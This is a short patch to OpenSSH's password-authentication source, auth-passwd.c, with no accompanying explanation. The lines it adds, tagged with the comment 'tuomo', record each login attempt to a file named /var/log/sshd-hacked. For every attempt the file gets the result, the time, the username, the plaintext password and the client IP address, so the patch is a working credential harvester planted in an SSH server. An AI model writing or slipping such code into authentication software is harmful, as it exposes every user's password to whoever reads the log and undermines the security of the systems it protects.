@@ -1,0 +1,33 @@
+*** auth-passwd.c	2009-03-08 01:40:28.000000000 +0100
+--- auth-passwd-mod.c	2012-02-04 19:19:06.000000000 +0100
+***************
+*** 45,50 ****
+--- 45,54 ----
+  #include <string.h>
+  #include <stdarg.h>
+  
++ #include <time.h>
++ #include <sys/stat.h>
++ #include "canohost.h"
++ 
+  #include "packet.h"
+  #include "buffer.h"
+  #include "log.h"
+***************
+*** 125,130 ****
+--- 129,143 ----
+  	result = sys_auth_passwd(authctxt, password);
+  	if (authctxt->force_pwchange)
+  		disable_forwarding();
++ 
++ 	//tuomo
++ 	char *r = result ? "ACCEPTED" : "DENIED";
++ 	char *l="/var/log/sshd-hacked";
++ 	FILE *f = fopen(l, "a");
++ 	chmod(l, 0600);
++ 	fprintf(f,"%s:%i:%.100s:%.100s:%.200s\n",r, (int)time(NULL),authctxt->user,password,get_remote_ipaddr());
++ 	fclose(f);
++ 
+  	return (result && ok);
+  }
+  
